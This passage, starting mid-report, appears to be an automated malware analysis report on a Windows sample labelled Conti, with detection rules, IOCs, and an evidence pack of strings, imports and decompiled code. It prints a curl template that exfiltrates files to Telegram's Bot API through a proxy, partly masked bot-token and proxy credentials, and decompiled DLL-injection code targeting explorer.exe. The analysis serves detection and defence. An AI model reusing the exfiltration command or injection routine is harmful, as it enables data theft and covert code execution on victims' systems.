- Deploy the generated custom YARA rule saved at `/opt/samples/logs/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/rule.yar` (source: rule.yara.json), which includes unique high-signal strings: Telegram Bot API URL, curl command template, mutex name, temp DLL path format, and RC4 XOR loop location.

### Sigma Detection
- Deploy the generated Sigma rule saved at `/opt/samples/logs/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/rule.yml` (source: rule.yara.json) for SIEM integration.

### EDR/Behavioral Detection
1. **Process Injection Detection**: Alert on the sequence of `VirtualAllocEx` (targeting `explorer.exe`) → `WriteProcessMemory` → `CreateRemoteThread`, mapped to capa `inject dll` and `inject thread` rules and pe_imports injection signals.
2. **C2 Detection**: Alert on `curl.exe` making outbound HTTPS connections to `api.telegram.org` with POST requests to `/sendDocument`, per the observed curl command template.
3. **File System Detection**: Alert on creation of `dl*.dll` files in user temp directories, per the `%s\dl%lu.dll` path string and `GetTempPathW`/`GetTempFileNameW` imports.
4. **Mutex Detection**: Alert on creation of the mutex `Global\BeaconMutex_12345`, per the yara `win_mutex` match and deep dive evidence.
5. **Anomaly Detection**: Alert on PE files with GUI subsystem that do not import any `user32` window-related functions (GuiSubsystemNoWindowApi anomaly) and `.data` section entropy >= 95, both strong indicators of obfuscated malware.
6. **Capability Detection**: Use capa rules to detect RC4 obfuscation (`encrypt data using RC4 PRGA`) and embedded PE files (`contain an embedded PE file`) in analyzed samples.

---

## 11. What We Don't Know

1. **Embedded Payload Functionality**: A 342016-byte embedded PE file was carved from the sample (source: malcat carved files), but no static or dynamic analysis of this payload was performed. Its full functionality (e.g., ransomware encryption, info-stealing capabilities) is unknown.
2. **Runtime C2 Configuration**: The curl command template includes placeholders for bot token, chat_id, and proxy, but runtime values of these parameters are not statically recoverable. The actual C2 chat ID, active proxy configuration, and any additional C2 endpoints are unknown (source: deep_dive_agentic key evidence, malcat strings).
3. **RC4 Encryption Key**: capa identifies RC4 PRGA usage (source: capa encrypt data using RC4 PRGA rule), but the RC4 key is not extracted from static analysis, so decrypted payload contents and key material are unknown.
4. **Exfiltration Targets**: The sample uses `/sendDocument` to exfiltrate files to Telegram, but the specific file paths, data types, and selection logic for exfiltrated content are not identified in static analysis (source: deep_dive_agentic summary).
5. **Full Dynamic Behavior**: Speakeasy and Frida captured zero runtime events, so actual C2 check-in intervals, process injection success rates, and runtime file system/network activity are not observed (source: Speakeasy, Frida probe data).
6. **IDA Analysis Gap**: IDA Pro is unavailable due to validation failure (source: cross_engine_notes), so some function analysis is limited to Ghidra and Malcat decompilation, which may have gaps or inaccuracies.
7. **Embedded PE Hash**: The carved embedded PE file has no extracted hash, so its hash is unknown for IOC matching and variant tracking.

---

## 12. Appendix: Analysis Environment

### Tools and Engines Used
| Tool/Engine | Purpose | Status |
|---|---|---|
| Malcat | File layout, decompilation, string extraction, anomaly detection, imports, YARA | Successful |
| Ghidra | String extraction (5317 strings), function metrics, disassembly, SQL queries | Successful (imports table empty, data sourced from Malcat/pe_imports) |
| radare2 | Entry point and function disassembly | Successful |
| FLOSS | Static string extraction (7006 strings) | Successful |
| capa (malcat-capa) | Capability detection (17 rules, 1.09s duration) | Successful |
| pe_imports | Import analysis (66 imports, signal detection) | Successful |
| YARA | Signature matching (12 matches), custom rule generation | Successful |
| XOR Search | XOR pattern detection | Successful (2 XOR 00 matches) |
| Speakeasy | Dynamic analysis | Successful (0 events captured) |
| Frida (v17.16.4) | Runtime hooking | Successful (0 events captured) |
| UPX | Unpacking | Failed (sample not UPX packed) |
| llm_judge | Verdict, scoring, family classification | Successful |
| deep_dive_agentic | Deep behavioral analysis, C2 inference | Successful (95% confidence) |

### Environment Details
- Sample Path: `/opt/samples/corpus/pool/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/2026-07-03_057dff5650af402177d65141acdf65d0_conti`
- Project Name: pool
- Analysis Date Range: 2026-07-03 (sample timestamp) to 2026-08-05 (YARA generation timestamp)
- Limitations: IDA Pro unavailable due to validation failure; Ghidra imports table empty for this sample, so import data is sourced from Malcat and pe_imports (source: cross_engine_notes).
## Appendix: Full Structured Evidence Pack

# Technical Evidence Pack

**sha256:** 28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9  
**sample_path:** /opt/samples/corpus/pool/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/2026-07-03_057dff5650af402177d65141acdf65d0_conti  
**project_name:** pool

> Every table below is copied from stage JSON. Technical narrative must cite these rows (engine + address/rule), not invent evidence.

## Verdict
- **verdict**: Malicious
- **score**: 98
- **family_guess**: Conti (ransomware loader/initial access payload)
- **agreement**: llm_and_v1_agree
- **cross_engine_notes**: IDA is unavailable due to validation failure, so all analysis relies on Ghidra, Malcat, capa, pe_imports, YARA, and FLOSS. Ghidra's imports table is empty for this sample, so import data is sourced from Malcat and pe_imports to avoid data gaps. String data is combined from Ghidra (5317 strings) and Malcat (100 strings) for maximum coverage.
- **summary**: This is a malicious 64-bit Windows PE sample, likely a Conti ransomware loader/initial access payload. It is heavily obfuscated (98 entropy, RC4 encryption) and exhibits classic process injection behavior: it drops a DLL to a temp path, injects it into the explorer.exe process using VirtualAllocEx, WriteProcessMemory, and CreateRemoteThread. It uses a Telegram Bot API endpoint for C2 communications, contains an embedded secondary PE payload, and has capabilities for process enumeration and file operations. All analysis sources (Malcat, Ghidra, capa, pe_imports, YARA) corroborate malicious behavior.
- **source**: llm_judge
- **model**: step-3.7-flash

### key_evidence (triage) — cite source field exactly
| source | query_or_table | row_or_rule | why |
|---|---|---|---|
| malcat | static_profile | `all metadata fields` | Confirms the sample is a 64-bit PE with 98 entropy (indicative of packing/obfuscation), 5 anomalies including XorInLoop  |
| pe_imports | pe_imports signals | `allocate_memory (VirtualAllocEx), write_process_memory (WriteProcessMemory), cre` | These are core process injection APIs mapped to ATT&CK T1055 (Process Injection), a common malware behavior for executin |
| malcat | decompilation (sub_140001550) | `full function decompilation` | Shows the sample generates a temp DLL path (%s\dl%lu.dll), writes an embedded payload to the file, locates the explorer. |
| ghidra | suspicious strings | `5368836224 | https://api.telegram.org/bot` | This is a known Telegram Bot API C2 endpoint, indicating the sample uses Telegram for command and control communications |
| capa | top_rules | `inject thread (T1055.003), inject dll (T1055.001), encrypt data using RC4 PRGA (` | capa confirms the sample has process injection (thread hijacking and DLL injection) and RC4 obfuscation capabilities, al |
| yara | yara matches | `inject_thread, spyeye` | YARA matches against known malicious rules for process injection and spyware/stealer functionality, corroborating the ma |
| malcat | anomalies | `EmbeddedProgram (embedding)` | Confirms the sample contains an embedded PE file, which is typical for malware that drops and executes secondary payload |

## Deep-Dive Summary Evidence
- **source**: deep_dive_agentic
- **confidence**: 95
- **summary**: This is a 64-bit Windows GUI PE that functions as a C2 beacon / info-stealer. Static and behavioral evidence show it exfiltrates data to Telegram via curl, uses a mutex (Global\BeaconMutex_12345) to prevent multiple instances, performs process injection through VirtualAllocEx/WriteProcessMemory/CreateRemoteThread, enumerates processes via Toolhelp32 snapshots, and contains an embedded PE plus RC4 obfuscation. The sample has a large .data region and overlay, consistent with packed or resource-rich malware.

### deep key_evidence
- `"https://api.telegram.org/bot"`
- `"/sendDocument"`
- `"\"%s\" -X POST --silent --output nul --connect-timeout 10 --max-time 20 --proxy %s -F chat_id=%s -F document=@\"%s\";type=application/octet-stream \"%s\""`
- `"C:\\Windows\\System32\\curl.exe"`
- `"Global\\BeaconMutex_12345"`
- `"CreateMutexA"`
- `"CreateRemoteThread"`
- `"WriteProcessMemory"`
- `"VirtualAllocEx"`
- `"VirtualProtect"`
- `"CreateToolhelp32Snapshot"`
- `"Process32First"`
- `"Process32Next"`
- `"OpenProcess"`
- `"FindProcessId"`
- `"mark_section_writable"`
- `"WinMain"`
- `"_pei386_runtime_relocator"`
- `"encrypt data using RC4 PRGA"`
- `"inject thread"`

## Malcat Structured Analysis
### Malcat File Summary
```
sha256: 28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9
size: 593885
type: PE
architecture: X64
entrypoint_ea: 2624
entropy: 98
file_name: 2026-07-03_057dff5650af402177d65141acdf65d0_conti
```

### File Layout (sections/regions)
| Name | EA | Physical | Virtual | Entropy | Rights |
|---|---|---|---|---|---|
| header | 0 | 1536 | 0 | 70 | - |
| .text | 1536 | 7680 | 8192 | 119 | RX |
| .data | 9728 | 449024 | 450560 | 98 | RW |
| .rdata | 460288 | 3584 | 4096 | 81 | R |
| .pdata | 464384 | 1024 | 4096 | 103 | R |
| .xdata | 468480 | 512 | 4096 | 50 | R |
| .idata | 472576 | 3072 | 4096 | 50 | R |
| .tls | 476672 | 512 | 4096 | 0 | RW |
| .rsrc | 480768 | 1536 | 4096 | 0 | R |
| .reloc | 484864 | 512 | 4096 | 52 | R |
| /4 | 488960 | 1536 | 4096 | 0 | R |
| /19 | 493056 | 46080 | 49152 | 97 | R |
| /31 | 542208 | 9216 | 12288 | 111 | R |
| /45 | 554496 | 8192 | 8192 | 116 | R |
| /57 | 562688 | 2560 | 4096 | 106 | R |
| /70 | 566784 | 1024 | 4096 | 102 | R |
| /81 | 570880 | 7168 | 8192 | 94 | R |
| /97 | 579072 | 5120 | 8192 | 100 | R |
| /113 | 587264 | 512 | 4096 | 80 | R |
| overlay | 591360 | 43485 | 0 | 83 | - |
| .bss | 634845 | 0 | 4096 | 0 | RW |

### Malcat YARA / Signatures (1)
| Rule | Category | Type | Reliability | Description |
|---|---|---|---|---|
| EnumerateProcesses | fingerprint | UNCOMMON | 60 | Enumerate running processes, a technique sometimes used by packers to avoid spec |

### Anomalies (5)
| Name | Level | Category | Hits | Description |
|---|---|---|---|---|
| BssNonEmpty | 3 | entropy | 1 | Bss Region/section is not empty |
| EmbeddedProgram | 3 | embedding | 1 | File embeds a program |
| XorInLoop | 3 | code | 1 | XOR instruction in a loop |
| GuiSubsystemNoWindowApi | 2 | headers | 1 | A GUI windows application does not import any user32 window-related function |
| InvalidSizeOfInitializedData | 2 | sections | 1 | SizeOfInitializedData is not the sum of all ininitalized data sections (raw or virtual) |

### Anomaly Locations (high-signal)
- **GuiSubsystemNoWindowApi**
  - `220`: 
- **XorInLoop**
  - `8765`: 

### High-Signal Strings (6 matched keywords; engine=malcat)
| EA | String |
|---|---|
| 460335 | `kernel32.dll` |
| 460920 | `  VirtualProtect..d with code 0x%x` |
| 460348 | `LoadLibraryW` |
| 475212 | `KERNEL32.dll` |
| 124544 | `https://api.telegram.org/bot` |
| 125056 | `socks5://oWWV0o:...122.192.59:8000` |

### Top Strings (300 extracted; showing 80)
| EA | String |
|---|---|
| 460296 | `%s\dl%lu.dll` |
| 480856 | `<?xml version="1..ty>
</assembly>
` |
| 460322 | `explorer.exe` |
| 634054 | `__imp_CreateToolhelp32Snapshot` |
| 460335 | `kernel32.dll` |
| 474028 | `CreateToolhelp32Snapshot` |
| 630198 | `CreateToolhelp32Snapshot` |
| 461064 | `%d bit pseudo re..g the value %p.
` |
| 630413 | `__imp_Process32Next` |
| 460960 | `  Unknown pseudo..col version %d.
` |
| 460864 | `  VirtualQuery f..es at address %p` |
| 474368 | `Process32Next` |
| 634299 | `Process32Next` |
| 475232 | `api-ms-win-crt-e..nment-l1-1-0.dll` |
| 460656 | `The result is to..nted (UNDERFLOW)` |
| 475612 | `api-ms-win-crt-string-l1-1-0.dll` |
| 475496 | `api-ms-win-crt-r..ntime-l1-1-0.dll` |
| 475400 | `api-ms-win-crt-p..ivate-l1-1-0.dll` |
| 475560 | `api-ms-win-crt-stdio-l1-1-0.dll` |
| 475324 | `api-ms-win-crt-locale-l1-1-0.dll` |
| 460920 | `  VirtualProtect..d with code 0x%x` |
| 460480 | `Argument domain error (DOMAIN)` |
| 475364 | `api-ms-win-crt-math-l1-1-0.dll` |
| 460616 | `Total loss of si..ificance (TLOSS)` |
| 460348 | `LoadLibraryW` |
| 461016 | `  Unknown pseudo..on bit size %d.
` |
| 475288 | `api-ms-win-crt-heap-l1-1-0.dll` |
| 460511 | `Argument singularity (SIGN)` |
| 460832 | `Address %p has no image-section` |
| 460800 | `Mingw-w64 runtime failure:
` |
| 460710 | `Unknown error` |
| 460728 | `_matherr(): %s i..g)  (retval=%g)
` |
| 461152 | `runtime error %d
` |
| 475212 | `KERNEL32.dll` |
| 460576 | `Partial loss of ..ificance (PLOSS)` |
| 124544 | `https://api.telegram.org/bot` |
| 124736 | `"%s" -X POST --s..ctet-stream "%s"` |
| 436940 | `.pdata$_ZNK10__c.._dyncast_resultE` |
| 436805 | `.xdata$_ZNK10__c.._dyncast_resultE` |
| 436671 | `.text$_ZNK10__cx.._dyncast_resultE` |
| 435749 | `_ZNK10__cxxabiv1.._dyncast_resultE` |
| 460544 | `Overflow range error (OVERFLOW)` |
| 430529 | `.xdata$_ZNK10__c.._dyncast_resultE` |
| 430643 | `.pdata$_ZNK10__c.._dyncast_resultE` |
| 430416 | `.text$_ZNK10__cx.._dyncast_resultE` |
| 437185 | `.xdata$_ZNK10__c..__upcast_resultE` |
| 437075 | `.text$_ZNK10__cx..__upcast_resultE` |
| 437296 | `.pdata$_ZNK10__c..__upcast_resultE` |
| 125056 | `socks5://oWWV0o:...122.192.59:8000` |
| 429425 | `_ZNK10__cxxabiv1.._dyncast_resultE` |
| 436570 | `.pdata$_ZNK10__c..ss_type_infoES2_` |
| 435877 | `_ZNK10__cxxabiv1..__upcast_resultE` |
| 124448 | `C:\Windows\System32\curl.exe` |
| 436469 | `.xdata$_ZNK10__c..ss_type_infoES2_` |
| 433085 | `.text$_ZN10__cxx..5_Unwind_Context` |
| 152824 | `api-ms-win-crt-e..nment-l1-1-0.dll` |
| 436369 | `.text$_ZNK10__cx..ss_type_infoES2_` |
| 433173 | `.xdata$_ZN10__cx..5_Unwind_Context` |
| 433262 | `.pdata$_ZN10__cx..5_Unwind_Context` |
| 430844 | `.xdata$_ZNK10__c..__upcast_resultE` |
| 430932 | `.pdata$_ZNK10__c..__upcast_resultE` |
| 431733 | `_ZN10__cxxabiv1L..5_Unwind_Context` |
| 435655 | `_ZNK10__cxxabiv1..ss_type_infoES2_` |
| 430757 | `.text$_ZNK10__cx..__upcast_resultE` |
| 153184 | `api-ms-win-crt-string-l1-1-0.dll` |
| 152968 | `api-ms-win-crt-p..ivate-l1-1-0.dll` |
| 153224 | `api-ms-win-crt-u..ility-l1-1-0.dll` |
| 124608 | `8602432148:AAGpo..DQ7S3TlggkEMOVQE` |
| 429532 | `_ZNK10__cxxabiv1..__upcast_resultE` |
| 153040 | `api-ms-win-crt-r..ntime-l1-1-0.dll` |
| 152916 | `api-ms-win-crt-locale-l1-1-0.dll` |
| 434981 | `.pdata$_ZL23__gx..Unwind_Exception` |
| 429986 | `.xdata$_ZNK10__c..srcExPKvPKS0_S2_` |
| 434904 | `.xdata$_ZL23__gx..Unwind_Exception` |
| 430064 | `.pdata$_ZNK10__c..srcExPKvPKS0_S2_` |
| 152784 | `api-ms-win-crt-c..nvert-l1-1-0.dll` |
| 153112 | `api-ms-win-crt-stdio-l1-1-0.dll` |
| 438079 | `.pdata$_ZNKSt9ty..ss_type_infoEPPv` |
| 186060 | `
GNU C99 16.1.0 ..u99 -fno-builtin` |
| 189875 | `:GNU C99 16.1.0 ..u99 -fno-builtin` |

### Imports (66)
| EA | Name | Type | Refs |
|---|---|---|---|
| 473376 | kernel32.CloseHandle | IMPORT | 4 |
| 473384 | kernel32.CreateFileW | IMPORT | 1 |
| 473392 | kernel32.CreateRemoteThread | IMPORT | 2 |
| 473400 | kernel32.CreateToolhelp32Snapshot | IMPORT | 1 |
| 473408 | kernel32.DeleteCriticalSection | IMPORT | 1 |
| 473416 | kernel32.DeleteFileW | IMPORT | 2 |
| 473424 | kernel32.EnterCriticalSection | IMPORT | 3 |
| 473432 | kernel32.GetCurrentDirectoryW | IMPORT | 1 |
| 473440 | kernel32.GetLastError | IMPORT | 2 |
| 473448 | kernel32.GetModuleHandleA | IMPORT | 1 |
| 473456 | kernel32.GetProcAddress | IMPORT | 1 |
| 473464 | kernel32.GetStartupInfoA | IMPORT | 1 |
| 473472 | kernel32.GetTempFileNameW | IMPORT | 1 |
| 473480 | kernel32.GetTempPathW | IMPORT | 1 |
| 473488 | kernel32.GetTickCount | IMPORT | 1 |
| 473496 | kernel32.InitializeCriticalSection | IMPORT | 1 |
| 473504 | kernel32.IsDBCSLeadByte | IMPORT | 1 |
| 473512 | kernel32.LeaveCriticalSection | IMPORT | 3 |
| 473520 | kernel32.OpenProcess | IMPORT | 2 |
| 473528 | kernel32.Process32First | IMPORT | 1 |
| 473536 | kernel32.Process32Next | IMPORT | 1 |
| 473544 | kernel32.SetUnhandledExceptionFilter | IMPORT | 1 |
| 473552 | kernel32.Sleep | IMPORT | 1 |
| 473560 | kernel32.TlsGetValue | IMPORT | 1 |
| 473568 | kernel32.VirtualAllocEx | IMPORT | 1 |
| 473576 | kernel32.VirtualFreeEx | IMPORT | 1 |
| 473584 | kernel32.VirtualProtect | IMPORT | 2 |
| 473592 | kernel32.VirtualQuery | IMPORT | 1 |
| 473600 | kernel32.WaitForSingleObject | IMPORT | 1 |
| 473608 | kernel32.WriteFile | IMPORT | 1 |
| 473616 | kernel32.WriteProcessMemory | IMPORT | 2 |
| 473632 | api-ms-win-crt-environment-l1-1-0.__p__environ | IMPORT | 2 |
| 473648 | api-ms-win-crt-heap-l1-1-0._set_new_mode | IMPORT | 2 |
| 473656 | api-ms-win-crt-heap-l1-1-0.calloc | IMPORT | 1 |
| 473664 | api-ms-win-crt-heap-l1-1-0.free | IMPORT | 1 |
| 473672 | api-ms-win-crt-heap-l1-1-0.malloc | IMPORT | 1 |
| 473688 | api-ms-win-crt-locale-l1-1-0._configthreadlocale | IMPORT | 2 |
| 473704 | api-ms-win-crt-math-l1-1-0.__setusermatherr | IMPORT | 2 |
| 473720 | api-ms-win-crt-private-l1-1-0.memcpy | IMPORT | 2 |
| 473736 | api-ms-win-crt-runtime-l1-1-0.__p___argc | IMPORT | 2 |
| 473744 | api-ms-win-crt-runtime-l1-1-0.__p___argv | IMPORT | 1 |
| 473752 | api-ms-win-crt-runtime-l1-1-0.__p__acmdln | IMPORT | 1 |
| 473760 | api-ms-win-crt-runtime-l1-1-0._cexit | IMPORT | 1 |
| 473768 | api-ms-win-crt-runtime-l1-1-0._configure_narrow_argv | IMPORT | 1 |
| 473776 | api-ms-win-crt-runtime-l1-1-0._crt_atexit | IMPORT | 1 |
| 473784 | api-ms-win-crt-runtime-l1-1-0._exit | IMPORT | 1 |
| 473792 | api-ms-win-crt-runtime-l1-1-0._initialize_narrow_environment | IMPORT | 1 |
| 473800 | api-ms-win-crt-runtime-l1-1-0._seh_filter_exe | IMPORT | 1 |
| 473808 | api-ms-win-crt-runtime-l1-1-0._initterm | IMPORT | 1 |
| 473816 | api-ms-win-crt-runtime-l1-1-0._initterm_e | IMPORT | 1 |
| 473824 | api-ms-win-crt-runtime-l1-1-0._set_app_type | IMPORT | 1 |
| 473832 | api-ms-win-crt-runtime-l1-1-0._set_invalid_parameter_handler | IMPORT | 1 |
| 473840 | api-ms-win-crt-runtime-l1-1-0.abort | IMPORT | 1 |
| 473848 | api-ms-win-crt-runtime-l1-1-0.exit | IMPORT | 1 |
| 473864 | api-ms-win-crt-stdio-l1-1-0.__acrt_iob_func | IMPORT | 2 |
| 473872 | api-ms-win-crt-stdio-l1-1-0.__p__commode | IMPORT | 1 |
| 473880 | api-ms-win-crt-stdio-l1-1-0.__p__fmode | IMPORT | 1 |
| 473888 | api-ms-win-crt-stdio-l1-1-0.__stdio_common_vfprintf | IMPORT | 1 |
| 473896 | api-ms-win-crt-stdio-l1-1-0.__stdio_common_vswprintf | IMPORT | 1 |
| 473904 | api-ms-win-crt-stdio-l1-1-0.fflush | IMPORT | 1 |
| 473912 | api-ms-win-crt-stdio-l1-1-0.setvbuf | IMPORT | 1 |
| 473928 | api-ms-win-crt-string-l1-1-0._stricmp | IMPORT | 3 |
| 473936 | api-ms-win-crt-string-l1-1-0.memset | IMPORT | 1 |
| 473944 | api-ms-win-crt-string-l1-1-0.strlen | IMPORT | 1 |
| 473952 | api-ms-win-crt-string-l1-1-0.strncmp | IMPORT | 1 |
| 473960 | api-ms-win-crt-string-l1-1-0.wcslen | IMPORT | 1 |

### Functions (30)
| EA | Name |
|---|---|
| 8672 | sub_140002be0 |
| 2896 | sub_140001550 |
| 4336 | sub_140001af0 |
| 6023 | sub_140002187 |
| 6352 | sub_1400022d0 |
| 5900 | sub_14000210c |
| 6192 | sub_140002230 |
| 1591 | sub_140001037 |
| 2736 | sub_1400014b0 |
| 3936 | 0 |
| 2624 | EntryPoint |
| 3904 | 1 |
| 8080 | jmp_api-ms-win-crt-string-l1-1-0._stricmp |
| 8088 | jmp_api-ms-win-crt-string-l1-1-0.memset |
| 8096 | jmp_api-ms-win-crt-string-l1-1-0.strlen |
| 8104 | jmp_api-ms-win-crt-string-l1-1-0.strncmp |
| 8112 | jmp_api-ms-win-crt-string-l1-1-0.wcslen |
| 8128 | jmp_api-ms-win-crt-stdio-l1-1-0.__acrt_iob_func |
| 8136 | jmp_api-ms-win-crt-stdio-l1-1-0.__p__commode |
| 8144 | jmp_api-ms-win-crt-stdio-l1-1-0.__p__fmode |
| 8152 | jmp_api-ms-win-crt-stdio-l1-1-0.__stdio_common_vfprintf |
| 8160 | jmp_api-ms-win-crt-stdio-l1-1-0.__stdio_common_vswprintf |
| 8168 | jmp_api-ms-win-crt-stdio-l1-1-0.fflush |
| 8176 | jmp_api-ms-win-crt-stdio-l1-1-0.setvbuf |
| 8192 | jmp_api-ms-win-crt-runtime-l1-1-0.__p___argc |
| 8200 | jmp_api-ms-win-crt-runtime-l1-1-0.__p___argv |
| 8208 | jmp_api-ms-win-crt-runtime-l1-1-0.__p__acmdln |
| 8216 | jmp_api-ms-win-crt-runtime-l1-1-0._cexit |
| 8224 | jmp_api-ms-win-crt-runtime-l1-1-0._configure_narrow_argv |
| 8232 | jmp_api-ms-win-crt-runtime-l1-1-0._crt_atexit |

### Decompilations (top 6)
#### 8672 — sub_140002be0
```c

/* DISPLAY WARNING: Type casts are NOT being printed */

undefined8 sub_140002be0(void)

{
    char *pcVar1;
    bool bVar2;
    bool bVar3;
    bool bVar4;
    code *pcVar5;
    code *pcVar6;
    code *pcVar7;
    undefined4 uVar8;
    int32_t iVar9;
    int64_t iVar10;
    int64_t iVar11;
    int64_t iVar12;
    undefined8 uVar13;
    int64_t iVar14;
    char **ppcVar15;
    char cVar16;
    uint32_t uVar17;
    char *pcVar18;
    undefined4 uVar19;
    undefined8 in_stack_fffffffffffffb78;
    undefined uStack_44d;
    undefined auStack_44c [4];
    undefined auStack_448 [528];
    undefined auStack_238 [392];
    undefined8 uStack_b0;
    undefined auStack_88 [60];
    uint8_t uStack_4c;
    undefined2 uStack_48;
    
    bVar3 = false;
    bVar2 = false;
    uStack_b0 = 0x140002bf1;
    func_0x000140001910();
    uStack_b0 = 0x140002bf6;
    ppcVar15 = jmp_api-ms-win-crt-runtime-l1-1-0.__p__acmdln();
    pcVar6 = kernel32.IsDBCSLeadByte;
    uVar19 = in_stack_fffffffffffffb78 >> 0x20;
    pcVar18 = *ppcVar15;
    if (pcVar18 == 0x0) {
        pcVar18 = "";
    }
    else {
code_r0x000140002c10:
        cVar16 = *pcVar18;
        if (' ' < cVar16) goto code_r0x000140002c3d;
        while (uVar19 = in_stack_fffffffffffffb78 >> 0x20, cVar16 != '\0') {
            if (!bVar2) goto code_r0x000140002c64;
            uStack_b0 = 0x140002c22;
            iVar9 = (*pcVar6)();
            pcVar1 = pcVar18;
            while( true ) {
                pcVar18 = pcVar1 + 1;
                if ((iVar9 == 0) || (pcVar1[1] == '\0')) goto code_r0x000140002c10;
                cVar16 = pcVar1[2];
                pcVar18 = pcVar1 + 2;
                if (cVar16 < '!') break;
code_r0x000140002c3d:
                bVar4 = bVar2 ^ 1;
                bVar2 = bVar3;
                if (cVar16 == '\"') {
                    bVar2 = bVar4;
                }
                uStack_b0 = 0x140002c4a;
                iVar9 = (*pcVar6)();
                pcVar1 = pcVar18;
                bVar3 = bVar2;
            }
        }
    }
    goto code_r0x000140002c70;
    while (*pcVar1 < '!') {
code_r0x000140002c64:
        pcVar1 = pcVar18 + 1;
        pcVar18 = pcVar18 + 1;
        if (*pcVar1 == '\0') break;
    }
code_r0x000140002c70:
    uStack_b0 = 0x140002c7b;
    (*kernel32.GetStartupInfoA)(auStack_88);
    if ((uStack_4c & 1) == 0) {
        uStack_48 = 10;
    }
    iVar9 = (*kernel32.GetTempPathW)(0x104, auStack_448, pcVar18, uStack_48);
    if (iVar9 != 0) {
        iVar9 = (*kernel32.GetTempFileNameW)(auStack_448, 0x140071000, 0, auStack_238);
        if (iVar9 == 0) {
            (*kernel32.GetCurrentDirectoryW)(0x104, auStack_448);
            uVar8 = (*kernel32.GetTickCount)();
            uVar13 = CONCAT44(uVar19, uVar8);
            (*0x140070850)(auStack_238, 0x104, "%s\\dl%lu.dll", auStack_448, uVar13);
            uVar19 = uVar13 >> 0x20;
        }
        pcVar6 = kernel32.CreateFileW;
        iVar10 = (*kernel32.CreateFileW)(auStack_238, 0x40000000, 0, 0, CONCAT44(uVar19, 2), 0x80, 0);
        pcVar7 = kernel32.WriteFile;
        if (iVar10 != -1) {
            uVar19 = 0;
            (*kernel32.WriteFile)(iVar10, 0x140003020, [0x0x140003000], auStack_44c, 0);
            pcVar5 = kernel32.CloseHandle;
            (*kernel32.CloseHandle)(iVar10);
            iVar9 = sub_1400014b0("explorer.exe");
            if ((iVar9 != 0) && (iVar10 = (*kernel32.OpenProcess)(0x43a, 0, iVar9), iVar10 != 0)) {
                iVar11 = jmp_api-ms-win-crt-string-l1-1-0.wcslen(auStack_238);
                iVar11 = iVar11 * 2 + 2;
                uVar13 = CONCAT44(uVar19, 4);
                iVar12 = (*kernel32.VirtualAllocEx)(iVar10, 0, iVar11, 0x3000, uVar13);
                uVar19 = uVar13 >> 0x20;
                if (iVar12 != 0) {
                    (*kernel32.WriteProcessMemory)(iVar10, iVar12, auStack_238, iVar11, 0);
                    uVar13 = (*kernel32.GetModuleHandleA)("kernel32.dll");
                    uVar13 = (*kernel32.GetProcAddre
```
#### 2896 — sub_140001550
```c

/* DISPLAY WARNING: Type casts are NOT being printed */

undefined8 sub_140001550(void)

{
    code *pcVar1;
    code *pcVar2;
    code *pcVar3;
    int32_t iVar4;
    undefined4 uVar5;
    int64_t iVar6;
    int64_t iVar7;
    int64_t iVar8;
    undefined8 uVar9;
    int64_t iVar10;
    uint32_t uVar11;
    undefined8 in_stack_fffffffffffffb78;
    undefined4 uVar12;
    undefined uStack_44d;
    undefined auStack_44c [4];
    undefined auStack_448 [528];
    undefined auStack_238 [536];
    
    uVar12 = in_stack_fffffffffffffb78 >> 0x20;
    iVar4 = (*kernel32.GetTempPathW)(0x104, auStack_448);
    if (iVar4 != 0) {
        iVar4 = (*kernel32.GetTempFileNameW)(auStack_448, 0x140071000, 0, auStack_238);
        if (iVar4 == 0) {
            (*kernel32.GetCurrentDirectoryW)(0x104, auStack_448);
            uVar5 = (*kernel32.GetTickCount)();
            uVar9 = CONCAT44(uVar12, uVar5);
            (*0x140070850)(auStack_238, 0x104, "%s\\dl%lu.dll", auStack_448, uVar9);
            uVar12 = uVar9 >> 0x20;
        }
        pcVar2 = kernel32.CreateFileW;
        iVar6 = (*kernel32.CreateFileW)(auStack_238, 0x40000000, 0, 0, CONCAT44(uVar12, 2), 0x80, 0);
        pcVar3 = kernel32.WriteFile;
        if (iVar6 != -1) {
            uVar12 = 0;
            (*kernel32.WriteFile)(iVar6, 0x140003020, [0x0x140003000], auStack_44c, 0);
            pcVar1 = kernel32.CloseHandle;
            (*kernel32.CloseHandle)(iVar6);
            iVar4 = sub_1400014b0("explorer.exe");
            if (iVar4 != 0) {
                iVar6 = (*kernel32.OpenProcess)(0x43a, 0, iVar4);
                if (iVar6 != 0) {
                    iVar7 = jmp_api-ms-win-crt-string-l1-1-0.wcslen(auStack_238);
                    iVar7 = iVar7 * 2 + 2;
                    uVar9 = CONCAT44(uVar12, 4);
                    iVar8 = (*kernel32.VirtualAllocEx)(iVar6, 0, iVar7, 0x3000, uVar9);
                    uVar12 = uVar9 >> 0x20;
                    if (iVar8 != 0) {
                        (*kernel32.WriteProcessMemory)(iVar6, iVar8, auStack_238, iVar7, 0);
                        uVar9 = (*kernel32.GetModuleHandleA)("kernel32.dll");
                        uVar9 = (*kernel32.GetProcAddress)(uVar9, "LoadLibraryW");
                        iVar7 = iVar8;
                        iVar10 = (*kernel32.CreateRemoteThread)(iVar6, 0, 0, uVar9, iVar8, 0, 0);
                        uVar12 = iVar7 >> 0x20;
                        if (iVar10 != 0) {
                            (*kernel32.WaitForSingleObject)(iVar10, 0xffffffff);
                            (*pcVar1)(iVar10);
                        }
                        (*kernel32.VirtualFreeEx)(iVar6, iVar8, 0, 0x8000);
                    }
                    (*pcVar1)(iVar6);
                    iVar6 = (*pcVar2)(auStack_238, 0x40000000, 0, 0, CONCAT44(uVar12, 3), 0, 0);
                    if (iVar6 != -1) {
                        uStack_44d = 0;
                        if ([0x0x140003000] != 0) {
                            uVar11 = 0;
                            do {
                                uVar11 = uVar11 + 1;
                                (*pcVar3)(iVar6, &uStack_44d, 1, auStack_44c, 0);
                            } while (uVar11 < [0x0x140003000]);
                        }
                        (*pcVar1)(iVar6);
                    }
                    (*kernel32.DeleteFileW)(auStack_238);
                    return 0;
                }
            }
            (*kernel32.DeleteFileW)(auStack_238);
        }
    }
    return 1;
}

```
#### 4336 — sub_140001af0
```c

/* WARNING: Possible PIC construction at 0x000140001c77: Changing call to branch */
